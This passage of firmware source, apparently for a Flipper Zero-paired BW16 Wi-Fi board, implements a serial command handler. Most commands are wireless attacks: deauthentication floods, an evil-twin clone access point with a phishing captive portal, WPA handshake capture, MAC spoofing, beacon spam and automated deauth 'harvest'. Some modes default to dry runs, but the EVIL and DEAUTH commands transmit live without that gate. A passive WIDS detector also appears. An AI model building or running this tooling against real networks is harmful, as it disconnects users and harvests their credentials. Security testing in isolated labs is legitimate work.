      if (CAP_ON() || hsg_phase != HSG_IDLE || KON_LOAD() || SNIFF_ON() || wids_on ||
          hv_phase != HV_IDLE) {
        wifi_set_promisc(0, NULL, 0);
        HSCAP_SET(false);
        CAP_SET(false);
        KON_STORE(false);   // bare STOP releases every receiver owner
        SNIFF_SET(false);
        wids_on = false;
        hv_phase = HV_IDLE;
      }
      hsg_phase = HSG_IDLE;  // abort any in-flight HSGRAB/PKGRAB
      hsg_target_set = false;
      ghostSpam = false;
      secured = false;
      strcpy(wpa_pass,"");
      // "STOP <n>" removes one target and leaves the AP running (that is the info screen's toggle);
      // a bare "STOP", or an out-of-range index, tears everything down. The old code only honoured
      // the per-target form while no AP was up, so the toggle was dead once the clone was running.
      int numStation = 0;
      bool perTarget = arg_index(readString, 5, &numStation);
      if(perTarget){
        if(numStation < (int)scan_results.size()){
          wifis_temp.clear();
          unsigned int num_st_tmp;

          for(unsigned int i=0; i<deauth_wifis.size(); i++){
            num_st_tmp=deauth_wifis[i];
            if(num_st_tmp != numStation){
              wifis_temp.push_back(num_st_tmp);
            }
          }
          deauth_wifis.clear();
          for(unsigned int i=0; i<wifis_temp.size(); i++){
            num_st_tmp=wifis_temp[i];
            deauth_wifis.push_back(num_st_tmp);
          }
          current_num = 0;   // the list changed under the round-robin cursor
        }else{
          perTarget = false;
        }
      }
      if(!perTarget){
        destroyAP();
        deauth_wifis.clear();
        current_num = 0;
        DEBUG_SER_PRINT("Stop randomSSID\n");
        randomSSID = false;
        rickroll=false;
        ssid="";
      }
      led_w(LED_G, 0);
       
    }else if(readString.substring(0,6)=="RANDOM"){
      DEBUG_SER_PRINT("Start randomSSID\n");
      randomSSID = true;
        
    }else if(readString.substring(0,5)=="BSSID"){
      
      ssid = readString.substring(6,readString.length()-1);
      DEBUG_SER_PRINT("Starting BSSID "+ssid+"\n");
       
    }else if(readString.substring(0,8)=="PROBE204"){
      // Bench switch: "PROBE204 1" makes every OS connectivity probe answer 204 before a
      // submission, so a client that insists on internet validation stays on the AP while the
      // portal is being exercised. Default (and "PROBE204 0") is the real captive behaviour.
      String v = readString.substring(8); v.trim();
      web_lwip_set_probe204(v.toInt() != 0);
      atReply(v.toInt() != 0 ? "PROBE204:on" : "PROBE204:off");
    }else if(readString.substring(0,7)=="APSTART"){
      // Create AP: bring up an OPEN AP + the selected captive portal via the cooperative FSM.
      // atStart(..., portal=true) keeps loop() responsive: petrel_ap_begin supports 2.4 AND non-DFS
      // 5 GHz, and AT_HTTP serves the portal via web_lwip_start_portal (resolved from the `portal`
      // global that the host set with PORTAL <n>). Channel comes from the preceding CHANNEL command.
      char apssid[33];
      String ap_ssid = readString.substring(8); ap_ssid.trim();
      ap_ssid.toCharArray(apssid, 33);
      int apch = atoi(ap_channel);      // set by CHANNEL; 0 -> atStart falls back to ch6
      // Publish the URL only once the lifecycle accepted: a refused APSTART must not retarget a
      // running AP. atStart() sets webui_mode itself.
      if (atStart(apch, apssid, /*portal=*/true))
        build_portal_urls(apssid);      // DHCP opt-114 / DNS / cp.json host derive from the AP name
    }else if(readString.substring(0,8)=="RICKROLL"){
      
      rickroll =true;
      DEBUG_SER_PRINT("Starting BSSID "+ssid+"\n");
       
    }else if(readString.substring(0,9)=="GHOSTSPAM"){
      ghostSpam = true;
      DEBUG_SER_PRINT("Start GHOSTSPAM\n");
    }else if(readString.substring(0,10)=="PORTALHTML"){
      // Custom portal: append hex-encoded HTML (chunked from the Flipper SD file). Parsing stays
      // here; the mutation runs in the tcpip thread so it cannot interleave with a resolve.
      int s1 = readString.indexOf(' ');
      String hex = (s1 > 0) ? readString.substring(s1+1, readString.length()-1) : String("");
      web_lwip_portal_edit(portal_append_cb, hex.c_str());
      String r = "PORTALHTML:+" + String((unsigned)portalAdded) + " total=" + String((unsigned)customPortalLen);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,9)=="PORTALROT"){
      // C2: enable/disable portal rotation. Args: PORTALROT <0|1>
      int s1 = readString.indexOf(' ');
      int v = (s1 > 0) ? readString.substring(s1+1, readString.length()-1).toInt() : 0;
      web_lwip_portal_edit(portal_rot_cb, &v);
      String r = String("PORTALROT:") + (v != 0 ? "on" : "off");
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,11)=="PORTALCLEAR"){
      web_lwip_portal_edit(portal_clear_cb, NULL);
      Serial.println("PORTALCLEAR:ok"); Serial1.println("PORTALCLEAR:ok");
    }else if(readString.substring(0,10)=="PORTALHASH"){
      // Diagnostic: length + FNV-1a hash of the loaded custom portal, so we can prove the
      // bytes the board serves are identical to the SD file (catches upload corruption).
      web_lwip_portal_edit(portal_hash_cb, NULL);   // read in the tcpip thread: no torn read
      char b[80];
      snprintf(b, sizeof(b), "PORTALHASH:%u:%08lx", (unsigned)customPortalLen, portalHash);
      Serial.println(b); Serial1.println(b);
    }else if(readString.substring(0,6)=="PORTAL"){
      // Clamp: the resolver has a default, but PORTALROT wraps at 6 and an out-of-range index
      // silently pinned the Default page forever.
      int pv = readString.substring(7,readString.length()-1).toInt();
      if (pv < 0 || pv > 6) pv = 0;
      web_lwip_portal_edit(portal_select_cb, &pv);
       
    }else if(readString.substring(0,6)=="REASON"){
      deauth_reason = readString.substring(7,readString.length()-1).toInt();
       
    }else if(readString.substring(0,8)=="PASSWORD"){
      String password;
      password = readString.substring(9,readString.length()-1).c_str();
      password.toCharArray(wpa_pass, 64);
      Serial.println(password);
      Serial.println(wpa_pass);
      secured=true;

      
    
    }else if(readString.substring(0,7)=="CHANNEL"){
      // Parse with indexOf + trim, the way the commands that provably work here (CAPTURE, HSGRAB,
      // PORTALHTML) do. The old fixed-offset substring(8, length-1) never set ap_channel in the
      // field: createAP() then fell back to its default 6 on every start, so "Create AP" silently
      // ignored the chosen channel and every AP came up on 6.
      int sp = readString.indexOf(' ');
      String v = (sp > 0) ? readString.substring(sp + 1) : String("");
      v.trim();
      v.toCharArray(ap_channel, sizeof(ap_channel));
      // Echo what actually arrived: this is the only way to tell an unparsed value from a branch
      // that was never reached (a stray '\\r' or a mangled command shows up here immediately).
      String dbg = "CHANNEL raw=[" + readString + "] set=[" + ap_channel + "]";
      Serial.println(dbg); Serial1.println(dbg);


    }else if(readString.substring(0,5)=="HOPCH"){
      // HOPCH 1,6,11,36,48  -> receive sweep plan (dual-band allowed; TX still refuses DFS).
      int sp = readString.indexOf(' ');
      String list = (sp > 0) ? readString.substring(sp + 1) : String("");
      uint8_t n = 0;
      int start = 0;
      while(start >= 0 && n < sizeof(hop_channels)) {
        int comma = list.indexOf(',', start);
        String tok = (comma < 0) ? list.substring(start) : list.substring(start, comma);
        int ch = tok.toInt();
        if(ch >= 1 && ch <= 165) hop_channels[n++] = (uint8_t)ch;
        start = (comma < 0) ? -1 : comma + 1;
      }
      if(n > 0) hop_count = n;
      char hb[48];
      snprintf(hb, sizeof(hb), "HOPCHSET:%u", (unsigned)hop_count);
      Serial.println(hb); Serial1.println(hb);
    }else if(readString.substring(0,5)=="APMAC"){
      String mac;
      mac = readString.substring(6,readString.length()-1);
      //wifi_disconnect();
      DEBUG_SER_PRINT("APMAC "+mac+"\n");
      char macStr[20];
      mac.toCharArray(macStr, sizeof(macStr));
      uint8_t parsed[6];
      if(mac.length() == 17 && parse_mac_colon(macStr, parsed)){
        memcpy(customMac, parsed, 6);
        useCustomMac=true;

        Serial.print("MAC en bytes: ");
        for (int i = 0; i < 6; i++) {
            if (customMac[i] < 0x10) Serial.print("0"); 
            Serial.print(customMac[i], HEX);
            if (i < 7) Serial.print(":");
        }
        Serial.println();
        mac.replace(":","");
        int ret = wifi_change_mac_address_from_ram(1,customMac);
        if(ret==RTW_ERROR){
          Serial1.println("ERROR:Bad Mac");
          Serial.println("ERROR:Bad Mac");
        }
      }else{
        useCustomMac=false;
      }
       
    }else if(readString.substring(0,5)=="HELLO"){
      // A: capability/handshake advertisement (5Ghost-compatible shape).
      String id = String("IDENT:brand=PETREL;fw=") + PETREL_FW_VERSION +
                  ";proto=1;caps=" + PETREL_FW_CAPS + ";board=BW16";
      Serial.println(id); Serial1.println(id);
    }else if(readString.substring(0,9)=="DEAUTHADD"){
      // C: add a target to the multi-target deauth list.
      // Args: DEAUTHADD <bssid-12hex> [client-12hex] [ch]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      String b = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      String c = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("");
      int ch = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 6;
      uint8_t bssid[6], client[6];
      bool have = false;
      if(!hex_to_mac(b, bssid) || !is_valid_tx_channel(ch) || (c.length() && !hex_to_mac(c, client))){
        Serial.println("ERR:DEAUTHADD:badargs"); Serial1.println("ERR:DEAUTHADD:badargs");
      }else if(dauth_n >= DAUTH_MAX){
        Serial.println("ERR:DEAUTHADD:full"); Serial1.println("ERR:DEAUTHADD:full");
      }else{
        have = (c.length() == 12);
        dauth_add(bssid, have ? client : NULL, have, (uint8_t)ch);
        String r = "DEAUTHADD:OK n=" + String((unsigned)dauth_n);
        Serial.println(r); Serial1.println(r);
      }
    }else if(readString.substring(0,9)=="DEAUTHRUN"){
      // C: arm the accumulated list (round-robin in loop()).
      dauth_run = (dauth_n > 0);
      dauth_idx = 0;
      String r = "DEAUTHRUN:" + String(dauth_run ? "on n=" : "no-targets n=") + String((unsigned)dauth_n);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,11)=="DEAUTHCLEAR"){
      // C: clear the list WITHOUT the WiFi teardown that STOP does.
      dauth_run = false;
      dauth_n = 0;
      deauth_wifis.clear();
      current_num = 0;
      Serial.println("DEAUTHCLEAR:ok"); Serial1.println("DEAUTHCLEAR:ok");
    }else if(readString.substring(0,8)=="EVILTWIN"){   // checked before "EVIL" (substring 0,4)
      // M3: evil-twin FSM.  EVILTWIN START <bssid-12hex> <ssid> <ch> [LIVE] | STOP | STATUS
      // DEFAULT DRY (logs "would clone/deauth", no RF). LIVE = real clone AP + portal + deauth of
      // the real AP (owner-only, RF-isolated lab).
      String sub = readString.substring(8); sub.trim();
      if(sub.startsWith("START")){
        String rest = sub.substring(5); rest.trim();   // <bssid> <ssid> <ch> [LIVE]
        int a = rest.indexOf(' ');
        int b = (a > 0) ? rest.indexOf(' ', a + 1) : -1;
        int c = (b > 0) ? rest.indexOf(' ', b + 1) : -1;
        String bhex = (a > 0) ? rest.substring(0, a) : rest;
        String ess  = (a > 0) ? rest.substring(a + 1, b > 0 ? b : rest.length()) : String("");
        int ch = (b > 0) ? rest.substring(b + 1, c > 0 ? c : rest.length()).toInt() : 6;
        bool live = (sub.indexOf("LIVE") >= 0);
        uint8_t bs[6]; bool okb = hex_to_mac(bhex, bs);
        if(!okb || ess.length() == 0 || ch < 1 || ch > 165){
          Serial1.println("EVILTWIN:usage START <bssid-12hex> <ssid> <ch> [LIVE]");
        }else if(live && !is_valid_tx_channel(ch)){
          // LIVE brings up a clone AP, and an AP cannot sit on a DFS channel: refuse now instead of
          // spending the 4 s deauth burst and then failing in atStartClone.
          Serial1.println("EVILTWIN:clone channel refused (DFS/out-of-range; use 1-14 or 36-48/149-165)");
        }else if(apActive || CAP_ON() || hopping || hsg_phase != HSG_IDLE || atOwned() ||
                 dauth_run || hv_phase != HV_IDLE || wids_on || SNIFF_ON() || et_phase != ET_IDLE){
          Serial1.println("EVILTWIN:busy");
        }else{
          memcpy(et_bssid, bs, 6);
          int sl = ess.length(); if(sl > 32) sl = 32;
          ess.toCharArray(et_ssid, sl + 1);
          et_ch = ch; et_live = live; et_t = millis(); et_phase = ET_DEAUTH;
          // LIVE evil-twin brings up a clone AP + captive portal -> serve it via the raw-lwIP
          // portal listener (the Arduino WiFiServer never receives AP connections).
          web_portal_mode = live;
          char m[104], safe[33];
          sanitize_text(et_ssid, safe, sizeof(safe));
          snprintf(m, sizeof(m),
                   "EVILTWIN:started ssid=\"%s\" ch=%d target=%02X%02X%02X%02X%02X%02X %s",
                   safe, et_ch, et_bssid[0], et_bssid[1], et_bssid[2],
                   et_bssid[3], et_bssid[4], et_bssid[5], et_live ? "LIVE" : "DRY");
          Serial.println(m); Serial1.println(m);
          if(!et_live){   // dry: announce the first "would deauth" immediately
            snprintf(m, sizeof(m), "EVILTWIN:would deauth %02X%02X%02X%02X%02X%02X ch%d",
                     et_bssid[0], et_bssid[1], et_bssid[2], et_bssid[3], et_bssid[4], et_bssid[5], et_ch);
            Serial.println(m); Serial1.println(m);
          }
        }
      }else if(sub.startsWith("STOP")){
        releaseRadio("by command");
      }else if(sub.startsWith("STATUS")){
        char m[72];
        snprintf(m, sizeof(m), "EVILTWIN:phase=%d %s ssid=\"%s\"",
                 et_phase, et_live ? "LIVE" : "DRY", et_ssid);
        Serial.println(m); Serial1.println(m);
      }else{
        Serial1.println("EVILTWIN:usage START <bssid-12hex> <ssid> <ch> [LIVE]|STOP|STATUS");
      }
    }else if(readString.substring(0,4)=="EVIL"){
      // EVIL <n>: clone scan result n (its SSID + channel) as an open AP with the selected portal,
      // and deauth the real AP so its clients reconnect to us. The AP comes up through the
      // cooperative lifecycle (atStart), so loop() stays responsive; the old synchronous createAP()
      // is gone. The deauth list keeps running on the AP's own channel.
      int numStation;
      if(!arg_index(readString, 5, &numStation)) { atReply("ERROR:EVIL:badindex"); continue; }
      if(numStation >= (int)scan_results.size()){
        atReply("ERROR:EVIL:badindex");
      }else if(scan_results[numStation].ssid.length() == 0){
        atReply("ERROR:EVIL:badssid (rescan)");
      }else{
        char chbuf[4];
        itoa(scan_results[numStation].channel, chbuf, 10);
        // atStart() may still refuse (busy); only then publish the new portal host and the target,
        // otherwise a refused EVIL would leave the running AP advertising the wrong URL.
        if(createAP((char*)scan_results[numStation].ssid.c_str(), chbuf)){
          build_portal_urls(scan_results[numStation].ssid.c_str());
          deauth_wifis.push_back(numStation);
          atReply("EVIL:started");
        }
      }
    }else if(readString.substring(0,6)=="DEAUTH"){
      // DEAUTH <n>: add scan result n to the multi-target deauth list (TX only, no AP).
      int numStation;
      if(!arg_index(readString, 7, &numStation)) { atReply("ERROR:DEAUTH:badindex"); continue; }
      if(numStation < (int)scan_results.size()){
        bool dup = false;
        for(unsigned int i = 0; i < deauth_wifis.size(); i++)
          if(deauth_wifis[i] == numStation) { dup = true; break; }
        if(dup) { atReply("DEAUTH:already"); continue; }
        DEBUG_SER_PRINT("Deauthing "+(String)numStation+"\n");
        deauth_wifis.push_back(numStation);
        DEBUG_SER_PRINT("Deauthing "+scan_results[numStation].ssid+"\n");
      }else{
        DEBUG_SER_PRINT("Wrong AP");
      }

    }else if(readString.substring(0,6)=="REBOOT"){
      // 2026-10-29: soft reset on demand. The board's reset line is not wired to the Flipper, so a
      // wedged board could only be recovered with a USB cable; the app sends this instead.
      Serial.println("REBOOT:ack");
      Serial1.println("REBOOT:ack");
      Serial.flush();
      delay(50);
      NVIC_SystemReset();
    }else if(readString.substring(0,4)=="PING"){
      
      Serial.print("PONG\n");
      Serial1.print("PONG\n");
      
    }else if(readString.substring(0,5)=="LISTB"){
      // A timed-out scan is still appending to the vector; reading it now races reallocation.
      if (scan_running) {
        uint32_t w0 = millis();
        while (!SCANDONE_LOAD() && (millis() - w0) < 1500u) delay(10);
        if (SCANDONE_LOAD()) scan_running = false;
        else { atReply("ERROR:LIST:scan still running"); continue; }
      }
      // M0.3: binary scan list. One DP_SCAN_AP frame per AP, self-delimiting via `total` (the FAP
      // stores into a fixed array -> no heap growth, which is what actually fixes B2). Emitted on
      // BOTH UARTs: Serial1 for the FAP, Serial for host verification over CH340. Additive — the
      // ASCII LIST below is untouched. Checked before LIST so "LIST" (substring 0,4) can't shadow it.
      // payload: idx(u8) total(u8) bssid[6] ch(u8) sec(u32 LE) rssi(i16 LE) ssid_len(u8) ssid[..]
      // sec is the full Realtek bitmask (WPA2 is 0x00200000), so one byte truncated it to 0.
      {
        uint8_t total = (uint8_t)(scan_results.size() > 255 ? 255 : scan_results.size());
        uint8_t pay[2 + 6 + 1 + 4 + 2 + 1 + 32];
        uint8_t out[PETREL_FRAME_MAX];
        if (total == 0) {                       // still signal "done, 0 results"
          uint8_t p0[2] = {0, 0};
          size_t n = petrel_encode(DP_SCAN_AP, p0, 2, out);
          Serial.write(out, n); Serial1.write(out, n);
        }
        for (uint8_t i = 0; i < total; i++) {
          WiFiScanResult &r = scan_results[i];
          uint8_t sl = (uint8_t)(r.ssid.length() > 32 ? 32 : r.ssid.length());
          size_t k = 0;
          pay[k++] = i;
          pay[k++] = total;
          memcpy(pay + k, r.bssid, 6); k += 6;
          pay[k++] = r.channel;
          pay[k++] = (uint8_t)(r.security & 0xFF);
          pay[k++] = (uint8_t)((r.security >> 8) & 0xFF);
          pay[k++] = (uint8_t)((r.security >> 16) & 0xFF);
          pay[k++] = (uint8_t)((r.security >> 24) & 0xFF);
          pay[k++] = (uint8_t)(r.rssi & 0xFF);
          pay[k++] = (uint8_t)((r.rssi >> 8) & 0xFF);
          pay[k++] = sl;
          memcpy(pay + k, r.ssid.c_str(), sl); k += sl;
          size_t n = petrel_encode(DP_SCAN_AP, pay, (uint16_t)k, out);
          Serial.write(out, n);
          Serial1.write(out, n);
        }
      }
    }else if(readString.substring(0,4)=="LIST"){
      if (scan_running) {
        uint32_t w0 = millis();
        while (!SCANDONE_LOAD() && (millis() - w0) < 1500u) delay(10);
        if (SCANDONE_LOAD()) scan_running = false;
        else { atReply("ERROR:LIST:scan still running"); continue; }
      }

      for (uint i = 0; i < scan_results.size(); i++) {
        // The line is '|'-delimited, so a '|' inside the SSID would shift every later field. Print
        // it as '?' - the same substitution the FAP's binary decoder makes, so both paths agree.
        String safe = scan_results[i].ssid;
        safe.replace("|", "?");
        char safe2[33]; sanitize_text(safe.c_str(), safe2, sizeof(safe2));
        String safe3 = String(safe2) + "|";
        Serial.print("AP:"+String(i)+"|");
        Serial.print(safe3);
        Serial1.print("AP:"+String(i)+"|");
        Serial1.print(safe3);
        {
          // %02X: bytes <0x10 must keep their leading zero, else the host's colon-stripped
          // 12-hex BSSID (used by HSGRAB/PKGRAB/DEAUTHADD) comes up short and is rejected,
          // and the info screen's MAC is wrong. (Arduino's print(x, HEX) does NOT pad.)
          char mac[18];
          snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                   scan_results[i].bssid[0], scan_results[i].bssid[1],
                   scan_results[i].bssid[2], scan_results[i].bssid[3],
                   scan_results[i].bssid[4], scan_results[i].bssid[5]);
          Serial.print(mac);
          Serial1.print(mac);
        }
        Serial.print("|" + String(scan_results[i].channel) + "|");
        Serial.print(String(scan_results[i].security) + "|");
        Serial.print(String(scan_results[i].rssi) + "\n");
        Serial1.print("|" + String(scan_results[i].channel) + "|");
        Serial1.print(String(scan_results[i].security) + "|");
        Serial1.print(String(scan_results[i].rssi) + "\n");
      }
      // LIST END marker (backlog 0.9, architect's matrix): the rows above had no terminator, so a
      // host could not tell a complete list from one still streaming - the FAP had to guess with a
      // deadline and then raced the board's own scan. One line makes the end explicit.
      {
        char le[32];
        snprintf(le, sizeof(le), "LISTEND:%u", (unsigned)scan_results.size());
        Serial.println(le);
        Serial1.println(le);
      }

    }else if(readString.substring(0,11)=="PROMISCTEST"){
      // GATE experiment: set channel, passively capture 802.11 frames, report counts.
      // Args: PROMISCTEST <chan> [seconds]  (default 10s, max 60s).
      int s1 = readString.indexOf(' ');
      int s2 = readString.indexOf(' ', s1+1);
      int ch = readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt();
      int secs = (s2>0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      pm_total=0; pm_mgmt=0; pm_ctrl=0; pm_data=0; pm_eapol=0;
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_spike_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
      String r = "PROMISC: ch="+String(ch)+" total="+String((unsigned)pm_total)+
                 " mgmt="+String((unsigned)pm_mgmt)+" ctrl="+String((unsigned)pm_ctrl)+
                 " data="+String((unsigned)pm_data)+" eapol="+String((unsigned)pm_eapol);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,7)=="CAPTURE"){
      // P5: monitor <chan> for [secs] and stream any EAPOL (4-way) frames as HSFRAME:<hex>.
      // Passive — no injection. Args: CAPTURE <chan> [seconds]  (default 10s, max 60s).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      if(apActive) destroyAP();   // tear the softAP down first: its HTTP accept loop starves
                                  // the monitor capture (CAPTURE/HSGRAB otherwise never finish)
      // A repeated CAPTURE must not reset the buffers under a live callback: quiesce first.
      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
      HSCAP_SET(false);
      HSCOUNT_SET(0);
      cap_ch = ch;
      hsg_target_set = false;   // passive CAPTURE is channel-wide: keep every AP's EAPOL
      HSCAP_SET(true);
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_spike_cb, 0);
      cap_deadline = millis() + (uint32_t)secs * 1000u;
      CAP_SET(true);       // loop() finishes it after `secs`; CAPSTOP aborts early
      Serial.println("CAPTURE: armed"); Serial1.println("CAPTURE: armed");
    }else if(readString.substring(0,7)=="CAPSTOP"){
      // B: abort an in-flight capture and stream what we have.
      if(CAP_ON()){
        wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
        HSCAP_SET(false);
        CAP_SET(false);
        hs_stream(cap_ch);
      }else{
        Serial.println("CAPSTOP: idle"); Serial1.println("CAPSTOP: idle");
      }
    }else if(readString.substring(0,6)=="SNIFF "){   // trailing space: must not shadow SNIFFDEAUTH
      // M0.2: live binary frame stream.  SNIFF START [ch]  |  SNIFF STOP
      // Streams every 802.11 frame on <ch> as DP_FRAME over CH340 until STOP. One radio, so it is
      // exclusive with scan/hop/capture/AP (refused while those own it; the command gate refuses
      // everything but STOP/PING while it owns the radio). All replies go on Serial1 (control).
      String sub = readString.substring(5); sub.trim();
      if(sub.startsWith("START")){
        if(apActive || CAP_ON() || hopping || hsg_phase != HSG_IDLE || atOwned()){
          Serial1.println("SNIFF:busy");
        }else{
          int sp = sub.indexOf(' ');
          int ch = (sp > 0) ? sub.substring(sp+1).toInt() : 6;
          if(ch < 1 || ch > 165) ch = 6;
          FRM_STORE(&frm_head, 0); FRM_STORE(&frm_tail, 0); __atomic_store_n(&frm_drop, 0u, __ATOMIC_RELAXED);
          SNIFF_SET(true);        // arm before promisc so the first frame is captured
          wext_set_channel(WLAN0_NAME, ch);
          wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_spike_cb, 0);
          Serial1.print("SNIFF:armed ch="); Serial1.println(ch);
        }
      }else if(sub.startsWith("STOP")){
        if(SNIFF_ON()){
          wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
          SNIFF_SET(false);
          Serial1.print("SNIFF:stopped drop=");
          Serial1.println((unsigned)FRM_LOAD(&frm_drop));
        }else{
          Serial1.println("SNIFF:idle");
        }
      }else{
        Serial1.println("SNIFF:usage START [ch]|STOP");
      }
    }else if(readString.substring(0,10)=="FRAMEBENCH"){
      // M0 transport bench: blast <count> synthetic DP_FRAME over CH340 (bulk) as fast as the UART
      // allows so the host measures sustained framed throughput AND verifies CRC/payload integrity
      // at the current bulk baud (921600 is a less-forgiving divisor; clock error -> CRC fails).
      // Bypasses the ring (pure TX). Payload is a known pattern raw[j]=(i+j). Control reply on Serial1.
      // FRAMEBENCH <count> [paylen]   count<=20000, paylen<=256.
      String sub = readString.substring(10); sub.trim();
      int sp = sub.indexOf(' ');
      long count  = (sp > 0 ? sub.substring(0, sp) : sub).toInt();
      int  paylen = (sp > 0) ? sub.substring(sp + 1).toInt() : 256;
      if(count < 1) count = 1;  if(count > 20000) count = 20000;
      if(paylen < 1) paylen = 1; if(paylen > (int)FRM_SLOT) paylen = (int)FRM_SLOT;
      Serial1.print("FRAMEBENCH:start n="); Serial1.print(count);
      Serial1.print(" paylen="); Serial1.println(paylen);
      {
        uint8_t raw[FRM_SLOT], rec[PETREL_FRAMEREC_HDR + FRM_SLOT], out[PETREL_FRAME_MAX];
        for(long i = 0; i < count; i++){
          for(int j = 0; j < paylen; j++) raw[j] = (uint8_t)(i + j);
          size_t rn = petrel_framerec((uint32_t)i, (uint16_t)paylen, raw, (uint16_t)paylen, rec);
          size_t n  = petrel_encode(DP_FRAME, rec, (uint16_t)rn, out);
          Serial.write(out, n);
        }
      }
      Serial1.print("FRAMEBENCH:done n="); Serial1.println(count);
    }else if(readString.substring(0,7)=="HARVEST"){
      // M2: autonomous harvest.  HARVEST START [cycles] [LIVE] | STOP | STATUS
      // DEFAULT DRY (no deauth TX; logs intended targets). LIVE = real deauth harvest — owner-only,
      // run in an RF-isolated lab. Single radio => refuses to start if any other feature owns it.
      String sub = readString.substring(7); sub.trim();
      if(sub.startsWith("START")){
        if(apActive || CAP_ON() || hopping || hsg_phase != HSG_IDLE || atOwned() ||
           dauth_run || hv_phase != HV_IDLE){
          Serial1.println("HARVEST:busy");
        }else{
          int sp = sub.indexOf(' ');
          int cycles = 5;
          if(sp > 0){ int c = sub.substring(sp+1).toInt(); if(c > 0 && c <= HV_DONE_MAX) cycles = c; }
          hv_dry = (sub.indexOf("LIVE") < 0);   // DRY unless LIVE explicitly requested
          hv_targets_left = cycles;
          hv_done_n = 0;
          hv_phase = HV_SCAN;
          char m[64];
          snprintf(m, sizeof(m), "HARVEST:started cycles=%d %s", cycles, hv_dry ? "DRY" : "LIVE");
          Serial.println(m); Serial1.println(m);
        }
      }else if(sub.startsWith("STOP")){
        hv_stop("by command");
      }else if(sub.startsWith("STATUS")){
        char m[72];
        snprintf(m, sizeof(m), "HARVEST:phase=%d left=%d done=%u %s",
                 hv_phase, hv_targets_left, (unsigned)hv_done_n, hv_dry ? "DRY" : "LIVE");
        Serial.println(m); Serial1.println(m);
      }else{
        Serial1.println("HARVEST:usage START [cycles] [LIVE]|STOP|STATUS");
      }
    }else if(readString.substring(0,4)=="WIDS"){
      // M3: continuous passive WIDS.  WIDS START [ch] | STOP | STATUS   (listen-only / defensive)
      // Detects deauth-flood (rate) and evil-twin (RSN downgrade on a known BSSID). Parks on <ch>.
      String sub = readString.substring(4); sub.trim();
      if(sub.startsWith("START")){
        if(apActive || CAP_ON() || hopping || hsg_phase != HSG_IDLE || atOwned() ||
           dauth_run || hv_phase != HV_IDLE || SNIFF_ON()){
          Serial1.println("WIDS:busy");
        }else{
          int sp = sub.indexOf(' ');
          int ch = (sp > 0) ? sub.substring(sp+1).toInt() : 6;
          if(ch < 1 || ch > 165) ch = 6;
          // A repeated START while the callback is live would reset the ring under the producer:
          // quiesce first (promisc off), then reset, then re-arm.
          wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
          wids_ch = ch;
          wids_init(&g_wids);
          FRM_STORE(&wids_qh, 0); FRM_STORE(&wids_qt, 0);
          wids_on = true;
          wext_set_channel(WLAN0_NAME, ch);
          wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_wids_cb, 0);
          char m[48]; snprintf(m, sizeof(m), "WIDS:started ch=%d", ch);
          Serial.println(m); Serial1.println(m);
        }
      }else if(sub.startsWith("STOP")){
        if(wids_on){
          wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
          wids_on = false;
          char m[56]; snprintf(m, sizeof(m), "WIDS:stopped frames=%lu",
                               (unsigned long)__atomic_load_n(&g_wids.seen_frames, __ATOMIC_RELAXED));
          Serial.println(m); Serial1.println(m);
        }else{
          Serial1.println("WIDS:idle");
        }
      }else if(sub.startsWith("STATUS")){
        char m[64]; snprintf(m, sizeof(m), "WIDS:on=%d ch=%d frames=%lu",
                             (int)wids_on, wids_ch,
                             (unsigned long)__atomic_load_n(&g_wids.seen_frames, __ATOMIC_RELAXED));
        Serial.println(m); Serial1.println(m);
      }else{
        Serial1.println("WIDS:usage START [ch]|STOP|STATUS");
      }
    }else if(readString.substring(0,5)=="WEBUI"){
      // M4: board WebUI — read-only status page over the SoftAP.  WEBUI START | STOP | DUMP
      // Brings up PETRELTESTAP; the raw-lwIP listener serves the status page (not a portal) while
      // webui_mode is set.
      String sub = readString.substring(5); sub.trim();
      if(sub.startsWith("START")){
        if(apActive || CAP_ON() || hopping || hsg_phase != HSG_IDLE || atOwned() ||
           dauth_run || hv_phase != HV_IDLE || wids_on || SNIFF_ON() || et_phase != ET_IDLE){
          Serial1.println("WEBUI:busy");
        }else{
          webui_mode = true;
          atStart();   // async AP bring-up via the cooperative lifecycle
          Serial.println("WEBUI:started (join PETRELTESTAP, open http://192.168.4.1/)");
          Serial1.println("WEBUI:started");
        }
      }else if(sub.startsWith("STOP")){
        web_lwip_stop();
        webui_mode = false;
        if(atOwned()) atStop();
        Serial.println("WEBUI:stopped"); Serial1.println("WEBUI:stopped");
      }else if(sub.startsWith("DUMP")){
